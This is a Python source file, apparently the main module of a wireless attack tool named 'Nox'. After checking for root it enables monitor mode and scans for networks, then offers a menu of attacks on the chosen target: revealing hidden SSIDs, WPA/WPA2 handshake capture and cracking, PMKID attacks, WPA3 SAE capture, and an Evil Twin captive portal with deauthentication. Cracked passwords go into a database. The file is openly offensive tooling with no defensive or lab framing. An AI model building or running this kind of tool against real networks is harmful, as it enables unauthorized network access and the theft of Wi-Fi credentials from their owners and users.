import sys
import os
from .core.ui import clear_screen, print_error, print_status, Colors
from .core.config import Config
from .interface.manager import InterfaceManager
from .scanner.airodump import AirodumpScanner
from .attacks.wpa import WPAAttack
from .attacks.decloak import DecloakAttack
from .attacks.pmkid import PMKIDAttack
from .attacks.wpa3 import WPA3Attack
from .attacks.eviltwin import EvilTwinAttack
from .core.database import Database

class NoxApp:
    def __init__(self):
        Config.initialize()
        self.db = Database()
        self.iface_manager = InterfaceManager()

    def check_root(self):
        if os.geteuid() != 0:
            print_error("This tool must be run as root (sudo).")
            sys.exit(1)

    def run(self):
        self.check_root()
        clear_screen()
        
        interfaces = self.iface_manager.get_interfaces()
        if not interfaces:
            print_error("No wireless interfaces found.")
            return

        print(f"{Colors.YELLOW}[?] Select Interface:{Colors.END}")
        for i, iface in enumerate(interfaces):
            print(f" {i+1}) {iface}")
        
        try:
            choice = int(input(f"\n{Colors.CYAN}NOX > {Colors.END}")) - 1
            selected = interfaces[choice]
        except (ValueError, IndexError, KeyboardInterrupt):
            print_error("Exiting.")
            return

        mon_iface = self.iface_manager.enable_monitor_mode(selected)
        if not mon_iface: return

        scanner = AirodumpScanner(mon_iface)
        try:
            scanner.scan()
        except KeyboardInterrupt:
            # Save all scanned targets to DB before exiting scan
            for target in scanner.targets:
                self.db.save_target(target)
            pass

        if not scanner.targets:
            print_error("No targets found.")
            self.iface_manager.disable_monitor_mode()
            return

        try:
            target_choice = int(input(f"\n{Colors.CYAN}Select Target ID: {Colors.END}")) - 1
            target = scanner.targets[target_choice]
        except (ValueError, IndexError, KeyboardInterrupt):
            print_error("Exiting.")
            self.iface_manager.disable_monitor_mode()
            return

        self.run_attack_menu(mon_iface, target)
        self.iface_manager.disable_all()

    def run_attack_menu(self, mon_iface, target):
        while True:
            clear_screen()
            if target.essid == "<Hidden>":
                print(f"{Colors.YELLOW}Target is a Hidden Network! [{target.bssid}]{Colors.END}")
                print("\n0) Reveal Hidden SSID (Decloak)")
            else:
                print(f"{Colors.GREEN}Target: {target.essid} [{target.bssid}]{Colors.END}")
                
            print("1) WPA/WPA2 Handshake Attack")
            print("2) PMKID Attack (Clientless)")
            print("3) WPA3 (SAE) Handshake Capture")
            print("4) Evil Twin Attack (Captive Portal)")
            print("5) Exit to Main Menu")
            
            try:
                attack_choice = input(f"\n{Colors.CYAN}NOX > {Colors.END}")
                if attack_choice == '0' and target.essid == "<Hidden>":
                    decloak = DecloakAttack(mon_iface, target)
                    new_essid = decloak.reveal()
                    if new_essid != "<Hidden>":
                        target.essid = new_essid
                        input(f"{Colors.GREEN}SSID Revealed! Press Enter to continue...{Colors.END}")
                elif attack_choice == '1':
                    wpa = WPAAttack(mon_iface, target)
                    cap = wpa.capture_handshake()
                    if cap:
                        self.db.save_handshake(target.bssid, target.essid, cap)
                        ans = input(f"{Colors.YELLOW}Crack now? (y/n): {Colors.END}")
                        if ans.lower() == 'y':
                            password = wpa.crack(cap)
                            if password:
                                self.db.save_password(target.bssid, target.essid, password)
                    input(f"\n{Colors.BLUE}Attack finished. Press Enter to return to menu...{Colors.END}")
                elif attack_choice == '2':
                    pmkid = PMKIDAttack(mon_iface, target)
                    hash_file = pmkid.run()
                    if hash_file:
                        self.db.save_handshake(target.bssid, target.essid, hash_file)
                    input(f"\n{Colors.BLUE}Attack finished. Press Enter to return to menu...{Colors.END}")
                elif attack_choice == '3':
                    wpa3 = WPA3Attack(mon_iface, target)
                    cap = wpa3.capture_sae()
                    if cap:
                        self.db.save_handshake(target.bssid, target.essid, cap)
                    input(f"\n{Colors.BLUE}Attack finished. Press Enter to return to menu...{Colors.END}")
                elif attack_choice == '4':
                    deauth_iface = mon_iface
                    other_ifaces = [i for i in self.iface_manager.get_interfaces() if i != mon_iface]
                    
                    if other_ifaces:
                        print(f"{Colors.YELLOW}[?] A second interface is available. Use it for Deauthentication? (y/n){Colors.END}")
                        ans = input(f"{Colors.CYAN}NOX > {Colors.END}")
                        if ans.lower() == 'y':
                            print(f"{Colors.YELLOW}Select Deauth Interface:{Colors.END}")
                            for i, iface in enumerate(other_ifaces):
                                print(f" {i+1}) {iface}")
                            try:
                                d_choice = int(input(f"\n{Colors.CYAN}NOX > {Colors.END}")) - 1
                                deauth_iface = self.iface_manager.enable_monitor_mode(other_ifaces[d_choice])
                            except:
                                pass
                    
                    eviltwin = EvilTwinAttack(mon_iface, target, deauth_interface=deauth_iface)
                    password = eviltwin.start()
                    if password:
                        self.db.save_password(target.bssid, target.essid, password)
                    input(f"\n{Colors.BLUE}Attack finished. Press Enter to return to menu...{Colors.END}")
                elif attack_choice == '5':
                    break
            except KeyboardInterrupt:
                break

if __name__ == "__main__":
    app = NoxApp()
    app.run()
